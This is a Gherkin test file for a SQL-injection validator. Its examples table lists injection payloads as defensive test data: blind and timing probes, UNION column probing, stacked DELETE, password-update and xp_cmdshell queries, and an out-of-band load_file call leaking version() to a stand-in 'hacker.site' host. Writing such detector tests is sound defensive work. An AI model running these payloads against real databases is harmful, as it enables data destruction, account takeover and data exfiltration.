#
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements. See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership. The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# "License"); you may not use this file except in compliance
# with the License. You may obtain a copy of the License at
#
# http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied. See the License for the
# specific language governing permissions and limitations
# under the License.
#

Feature: Security Utils SQL validator

  @security
  Scenario Outline: Verify that detects all configured SQL injection patterns
    Given A partial SQL statement <statement> with whitespaces fuzzy degree <fuzzy>
    When Validating the partial statement
    Then The validator had exception message <exception>

    Examples:
      | statement                                                                | fuzzy | exception                                                                             |
      | or 'a' = 'a'                                                             | 36    | SQL validation error: invalid SQL statement (detected 'inject-blind' pattern)         |
      | ' or 'a' = 'a'                                                           | 12    | SQL validation error: invalid SQL statement (detected 'inject-blind' pattern)         |
      | or 'a' = 'a' --                                                          | 27    | SQL validation error: invalid SQL statement (detected 'inject-blind' pattern)         |
      | or 'a' = 'a' /*                                                          | 17    | SQL validation error: invalid SQL statement (detected 'inject-blind' pattern)         |
      | abc' Or 'a' = 'a' /*                                                     | 19    | SQL validation error: invalid SQL statement (detected 'inject-blind' pattern)         |
      | OR 1 = 1                                                                 | 36    | SQL validation error: invalid SQL statement (detected 'inject-blind' pattern)         |
      | ' or 1 = 1                                                               | 17    | SQL validation error: invalid SQL statement (detected 'inject-blind' pattern)         |
      | or 1 = 1 -----                                                           | 57    | SQL validation error: invalid SQL statement (detected 'inject-blind' pattern)         |
      | or 1 = 1 /*                                                              | 11    | SQL validation error: invalid SQL statement (detected 'inject-blind' pattern)         |
      | 123                                                                      | 0     |                                                                                       |
      | 2.59                                                                     | 0     |                                                                                       |
      | abc123xyz                                                                | 0     |                                                                                       |
      | true                                                                     | 0     |                                                                                       |
      | [2024, 4, 21]                                                            | 7     |                                                                                       |
      | ["abc", "def", "ghi", "jkl", "mno"]                                      | 7     |                                                                                       |
      | ')                                                                       | 0     | SQL validation error: invalid SQL statement (detected 'detect-entry-point' pattern)   |
      | '))                                                                      | 0     | SQL validation error: invalid SQL statement (detected 'detect-entry-point' pattern)   |
      | ')))                                                                     | 0     | SQL validation error: invalid SQL statement (detected 'detect-entry-point' pattern)   |
      | `)                                                                       | 0     | SQL validation error: invalid SQL statement (detected 'detect-entry-point' pattern)   |
      | `)  )                                                                    | 19    | SQL validation error: invalid SQL statement (detected 'detect-entry-point' pattern)   |
      | `)))                                                                     | 0     | SQL validation error: invalid SQL statement (detected 'detect-entry-point' pattern)   |
      | `) ))))   )))))    ))) ))                                                | 23    | SQL validation error: invalid SQL statement (detected 'detect-entry-point' pattern)   |
      | ")                                                                       | 0     | SQL validation error: invalid SQL statement (detected 'detect-entry-point' pattern)   |
      | "))                                                                      | 0     | SQL validation error: invalid SQL statement (detected 'detect-entry-point' pattern)   |
      | ")))                                                                     | 19    | SQL validation error: invalid SQL statement (detected 'detect-entry-point' pattern)   |
      | 1' + sleep(10)                                                           | 7     | SQL validation error: invalid SQL statement (detected 'inject-timing' pattern)        |
      | 1' and Sleep(10)                                                         | 7     | SQL validation error: invalid SQL statement (detected 'inject-timing' pattern)        |
      | 1' && sleep(10)                                                          | 7     | SQL validation error: invalid SQL statement (detected 'inject-timing' pattern)        |
      | 1' \| SLEEP(10)                                                          | 7     | SQL validation error: invalid SQL statement (detected 'inject-timing' pattern)        |
      | 1' \|\| sleep(10)                                                        | 7     | SQL validation error: invalid SQL statement (detected 'inject-timing' pattern)        |
      | 1' \|\| pg_sleep(10)                                                     | 7     | SQL validation error: invalid SQL statement (detected 'inject-timing' pattern)        |
      | abc' && benchmark(    400000       , sha1(1)       )                     | 17    | SQL validation error: invalid SQL statement (detected 'inject-timing' pattern)        |
      | 1' and if(1=1, sleep(15), false)                                         | 19    | SQL validation error: invalid SQL statement (detected 'inject-timing' pattern)        |
      | 1 and (select sleep(10) from users where SUBSTR(table_name,1,1) = 'A') # | 19    | SQL validation error: invalid SQL statement (detected 'inject-timing' pattern)        |
      | ["conv('a',16,2)=conv('a',16,2)" ,"MYSQL"]                               | 39    | SQL validation error: invalid SQL statement (detected 'detect-backend' pattern)       |
      | ["connection_id()=connection_id()" ,"MYSQL"]                             | 39    | SQL validation error: invalid SQL statement (detected 'detect-backend' pattern)       |
      | ["crc32('MySQL')=crc32('MySQL')" ,"MYSQL"]                               | 39    | SQL validation error: invalid SQL statement (detected 'detect-backend' pattern)       |
      | ["pg_client_encoding()=pg_client_encoding()" ,"POSTGRESQL"]              | 39    | SQL validation error: invalid SQL statement (detected 'detect-backend' pattern)       |
      | ["get_current_ts_config()=get_current_ts_config()" ,"POSTGRESQL"]        | 39    | SQL validation error: invalid SQL statement (detected 'detect-backend' pattern)       |
      | ["quote_literal(42.5)=quote_literal(42.5)" ,"POSTGRESQL"]                | 39    | SQL validation error: invalid SQL statement (detected 'inject-timing' pattern)        |
      | ["current_database()=current_database()" ,"POSTGRESQL"]                  | 39    | SQL validation error: invalid SQL statement (detected 'detect-backend' pattern)       |
      | 1' ORDER by 1                                                            | 23    | SQL validation error: invalid SQL statement (detected 'detect-column' pattern)        |
      | 1' ORDER BY 1, 2                                                         | 23    | SQL validation error: invalid SQL statement (detected 'detect-column' pattern)        |
      | 1' ORDER BY 1, 2, 3                                                      | 23    | SQL validation error: invalid SQL statement (detected 'detect-column' pattern)        |
      | 1' group by 1                                                            | 23    | SQL validation error: invalid SQL statement (detected 'detect-column' pattern)        |
      | abc' group by 1, 2 --                                                    | 23    | SQL validation error: invalid SQL statement (detected 'detect-column' pattern)        |
      | 1' group by 1, 2, 3 /*                                                   | 23    | SQL validation error: invalid SQL statement (detected 'detect-column' pattern)        |
      | 1' Union Select 1                                                        | 23    | SQL validation error: invalid SQL statement (detected 'detect-column' pattern)        |
      | 1' Union Select 1, 2                                                     | 23    | SQL validation error: invalid SQL statement (detected 'detect-column' pattern)        |
      | 1' Union Select 1, 2, 3                                                  | 23    | SQL validation error: invalid SQL statement (detected 'detect-column' pattern)        |
      | 1' Union Select null                                                     | 23    | SQL validation error: invalid SQL statement (detected 'detect-column' pattern)        |
      | 1' union select null, null                                               | 23    | SQL validation error: invalid SQL statement (detected 'detect-column' pattern)        |
      | 1' UNION SELECT null, null, null                                         | 23    | SQL validation error: invalid SQL statement (detected 'detect-column' pattern)        |
      | checkedOnDate                                                            | 23    |                                                                                       |
      | officeName                                                               | 23    |                                                                                       |
      | resourceId                                                               | 23    |                                                                                       |
      | clientId                                                                 | 23    |                                                                                       |
      | processingResult                                                         | 23    |                                                                                       |
      | clientName                                                               | 23    |                                                                                       |
      | maker                                                                    | 23    |                                                                                       |
      | subresourceId                                                            | 23    |                                                                                       |
      | checker                                                                  | 23    |                                                                                       |
      | savingsAccountNo                                                         | 23    |                                                                                       |
      | loanAccountNo                                                            | 23    |                                                                                       |
      | groupName                                                                | 23    |                                                                                       |
      | entityName                                                               | 23    |                                                                                       |
      | madeOnDate                                                               | 23    |                                                                                       |
      | id                                                                       | 23    |                                                                                       |
      | loanId                                                                   | 23    |                                                                                       |
      | actionName                                                               | 23    |                                                                                       |
      | select load_file(concat('\\\\',version(),'.hacker.site\\a.txt'));        | 17    | SQL validation error: invalid SQL statement (detected 'detect-out-of-bands' pattern)  |
      | 1; DELETE FROM products                                                  | 19    | SQL validation error: invalid SQL statement (detected 'inject-stacked-query' pattern) |
      | 1; UPDATE members SET password='pwd' WHERE username='admin'              | 19    | SQL validation error: invalid SQL statement (detected 'inject-stacked-query' pattern) |
      | 1; exec master..xp_cmdshell 'DEL important_file.txt'                     | 19    | SQL validation error: invalid SQL statement (detected 'inject-stacked-query' pattern) |
      | 123 --                                                                   | 11    | SQL validation error: invalid SQL statement (detected 'inject-comment' pattern)       |
      | ' /*                                                                     | 11    | SQL validation error: invalid SQL statement (detected 'inject-comment' pattern)       |
      | abc' #                                                                   | 11    | SQL validation error: invalid SQL statement (detected 'inject-comment' pattern)       |
      | 2 ({                                                                     | 11    | SQL validation error: invalid SQL statement (detected 'inject-comment' pattern)       |

